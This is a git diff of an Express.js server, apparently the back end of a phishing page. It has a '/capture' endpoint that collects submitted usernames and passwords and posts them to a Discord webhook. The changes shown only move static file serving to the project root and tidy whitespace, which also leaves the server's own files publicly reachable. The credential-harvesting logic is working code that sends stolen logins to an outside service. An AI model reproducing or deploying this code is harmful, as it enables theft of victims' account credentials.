@@ -5,7 +5,7 @@ const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-app.use(express.static(path.join(__dirname, "site"), {
+app.use(express.static(__dirname, {
     etag: false,
     lastModified: false,
     setHeaders: (res) => {
@@ -20,14 +20,11 @@ const webhook = process.env.DISCORD_WEBHOOK;
 app.post("/capture", async (req, res) => {
     const username = req.body.username;
     const password = req.body.password;
-
     const safeUser = typeof username === "string" ? username : "";
     const safePass = typeof password === "string" ? password : "";
-
     if (!safeUser || !safePass) {
         return res.status(400).json({ error: "missing" });
     }
-
     try {
         await fetch(webhook, {
             method: "POST",
@@ -39,12 +36,11 @@ app.post("/capture", async (req, res) => {
     } catch (error) {
         console.error(error);
     }
-
     res.json({ status: "ok" });
 });
 
 app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "site/index.html"));
+    res.sendFile(path.join(__dirname, "index.html"));
 });
 
 app.listen(process.env.PORT || 3000, () => {
